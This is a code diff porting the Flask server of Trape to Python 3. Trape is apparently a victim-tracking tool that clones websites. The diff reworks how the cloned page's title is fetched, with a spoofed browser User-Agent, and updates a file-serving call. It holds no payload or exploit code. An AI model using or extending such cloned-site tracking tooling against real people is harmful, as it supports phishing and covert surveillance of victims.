@@ -11,13 +11,13 @@
 #
 # Copyright 2018 by Jose Pino (@jofpin) / <jofpin@gmail.com>
 #**
-from core.dependence import urllib2
 import sys
 import os
 from flask import Flask, render_template, session, request, json, redirect, url_for, send_from_directory
 from flask_cors import CORS
 from trape import Trape
 import urllib
+import urllib.request
 from core.db import Database
 
 # Main parts, to generate relationships among others
@@ -91,10 +91,15 @@ def home_get_preview():
 
 @app.route("/get_title", methods=["POST"])
 def home_get_title():
-    opener = urllib.request.build_opener()
-    html = opener.open(trape.url_to_clone).read()
-    html = html[html.find(b'<title>') + 7 : html.find(b'</title>')]
-    return json.dumps({'status' : 'OK', 'title' : html})
+    title = trape.victim_path
+    try:
+        req = urllib.request.Request(trape.url_to_clone, headers={'User-Agent': 'Mozilla/5.0'})
+        html = urllib.request.urlopen(req, timeout=8).read()
+        html = html[html.find(b'<title>') + 7 : html.find(b'</title>')]
+        title = html.decode('utf-8', 'ignore')
+    except Exception:
+        pass
+    return json.dumps({'status' : 'OK', 'title' : title})
 
 @app.route("/get_requests", methods=["POST"])
 def home_get_requests():
@@ -173,4 +178,4 @@ def style_redirect(CSSFile):
 @app.route("/static/files/<File>")
 def file_redirect(File):
     uploads = os.path.join(os.getcwd(), './')
-    return send_from_directory(directory=uploads, filename=File)
+    return send_from_directory(uploads, File)
